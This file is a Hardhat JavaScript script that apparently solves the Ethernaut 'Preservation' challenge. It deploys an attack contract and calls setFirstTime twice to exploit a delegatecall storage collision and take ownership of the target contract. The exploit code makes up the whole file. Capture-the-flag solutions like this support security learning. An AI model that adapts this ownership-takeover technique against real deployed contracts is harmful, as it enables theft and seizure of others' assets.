const { ethers } = require("hardhat");
const { subtask } = require("hardhat/config");
const useraddr = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const instanceaddr = "0x16E7D0bf530D2A8da712c2D9f0494d16889AE0Fc";

function sleep(sec) {
    return new Promise (resolve => setTimeout(resolve, sec * 1000));
}
async function main () {

    const signer = await ethers.getSigner(useraddr);
    const _Preservation = await ethers.getContractAt(
        "Preservation",
        instanceaddr,
        signer
    );
    const _attackcontract = await ethers.getContractFactory("Attack");
    const _deploy = await _attackcontract.deploy();
    const _attackaddress = _deploy.target;
    
    const _Acontract = await ethers.getContractAt(
        "Attack",
        _attackaddress,
        signer
    );
    console.log("Before the owner: ", await ethers.provider.getStorage(instanceaddr, 2));
    console.log("Attack contract address: ", _attackaddress);
    let recv = await ethers.provider.getStorage(instanceaddr, 0);
    console.log("Library1 address: ", recv);
    console.log("Setting to library1 address ")
    recv = await _Preservation.setFirstTime(_attackaddress);
    console.log(recv.hash);
    recv = await _Preservation.setFirstTime(useraddr);
    console.log(recv.hash);
    console.log("New owner: ", await ethers.provider.getStorage(instanceaddr, 2));
}

main().catch((error => {
    console.log(error);
    process.exit(1);
}))
